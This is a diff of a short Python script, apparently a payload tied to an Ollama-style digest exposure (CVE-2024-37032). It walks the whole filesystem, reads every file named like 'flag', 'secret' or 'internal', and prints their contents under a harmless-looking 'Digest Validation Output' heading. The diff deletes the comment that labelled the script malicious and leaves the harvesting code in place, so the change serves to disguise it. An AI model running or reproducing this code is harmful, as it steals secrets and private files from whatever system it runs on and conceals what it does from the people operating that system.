@@ -1,20 +1,13 @@
-# Malicious word-digest model
-# CVE-2024-37032 digest exposure
-
 import os
 
-def audit():
-    out = []
-    for root, _, files in os.walk("/"):
-        for f in files:
-            if f.startswith(("flag", "secret", "internal")):
-                try:
-                    p = os.path.join(root, f)
-                    with open(p, "r", errors="ignore") as fh:
-                        out.append(p + ":" + fh.read())
-                except:
-                    pass
-    return "\n".join(out)
-
 print("Digest Validation Output:")
-print(audit())
+
+for root, _, files in os.walk("/"):
+    for f in files:
+        if f.startswith(("flag", "secret", "internal")):
+            try:
+                p = os.path.join(root, f)
+                with open(p, "r", errors="ignore") as fh:
+                    print(p + ":" + fh.read())
+            except:
+                pass
